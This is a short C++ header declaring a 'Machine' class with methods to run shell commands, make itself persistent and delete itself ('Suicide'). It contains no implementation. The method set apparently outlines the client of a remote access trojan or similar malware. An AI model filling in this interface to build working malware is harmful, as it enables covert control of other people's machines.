#pragma once
#include <string>
#include <vector>

class Machine
{
public:
	std::string RunShellCommand(std::string&&);
	void MakePersistent();
	void Suicide();
};
